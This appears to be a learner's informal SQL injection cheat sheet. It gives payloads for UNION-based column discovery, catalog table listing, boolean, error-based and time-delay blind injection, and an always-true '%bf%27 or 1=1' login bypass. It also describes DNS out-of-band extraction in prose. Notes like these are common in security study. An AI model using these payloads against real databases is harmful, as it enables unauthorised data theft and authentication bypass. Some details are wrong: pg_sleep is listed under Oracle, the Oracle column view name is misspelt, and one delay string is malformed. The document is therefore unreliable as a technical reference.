## what is SQL injection

in this vulnearabilty the malicious sql statement will be inject by the attacker to compromise the database or server

## where to find

- see the parameter were the client send the request in form GET POST and we use `' , \\ ) " "'` etc to manipulate user input and break query.
- some site use filters to validate client input so we use URL encoded payloads

## union Query

for successfully execution union query  we must meet the no. of columns returning

## find number of columns vulnerable to SQL I

1. use order by 1 (integer ) and increment until error goes on
this will give us the number of columns that are returning
2. or another method is UNION Select NULL,NULL -- "if number of null DOESN'T match then DB gives error"
3. some times we need to put UNION select 1,1,1,1,1,1 â€”+ this may be work.

### note for Oracle Database

always use **From Dual --** in select query because it is the builtin table in oracle.

## find the column which gives us the string value in return

```
Query= 'UNION SELECT NULL,"A"+--+'

```

OR

```
query = ' UNION SELECT "A",NULL --+'

```

(if returns our string value in any columns that is data retrival point we can say)

## find DataBase Type and Version

## listing content of DB

### Listing tables

```
Query= 'information_schema.tables'

```

(list out the table names in the database)

### listing columns

```
Query= ' Select * from information_schema.columns Where table_name="table name we know" '

```

***NOTE:  always use + instead of (space)***

### For Oracle DataBase

**For tables**

```
Query= 'Select * from all_tables '

```

**For columns**

```
Query= 'Select * from all_tables_columns where table_name="table name"'

```

## String Concation

***used for concatenation multiple string in the single string***

## Sub-string or retrieve part of the string

# Blind sql injection vulnerability

### how to exploit

1. change logic of the Query to trigger detectable difference
2. trigger time delay
3. trigger out of band network interaction

### using conditional Response

```sql
Query = ' xyz AND "1"="1'

```

**if get response than xyz if true other wise it DIDN'T get response from server**    or

```sql
Query = ' xyz AND "1"="2'

```

### inducing conditional Response by Triggering SQL Error

```sql
Query = 'xyz AND ( Select CASE WHEN (1=2) Then 1/0 Else "a" END)="a'

```

**if condition is true server gives us the error if false
coudnt get error**

### for Oracle Data base

```sql
Query= 'xyz || (select case when(1=1) Then To_char(1/0) Else '' END From DUAL \\|\\| '

```

### exploit BY Generating Delay

```sql
query = '; if (condition true) waitfor Delay '0:0:10:'+--+'

```

gives 10 second delay in response if condition true else DIDN'T delay in response

### for oracle DB

```sql
Query = '|| pg_sleep(delay in seconds)+--+'

```

### exploit using OUt of band

in this append data in the form of subdomain in our domain and make a DNS lookup
that will reflect in our network traffic and that way we can extract data.
we also use burp collaberator

# 2nd Order SQL Injection

### it happens when our input stored in the application and then later handling different HTTP request the app retrieve stored data and our sql query is executed and we successfully u injected our payload in the server and also executed our SQL Query.

- Using the string `\xBF'` (URL-encoded as `%bf%27`), it's possible to get a single quote that will not get escaped properly. It's therefore possible to inject an always-true condition using `%bf%27 or 1=1 --` and bypass the authentication.
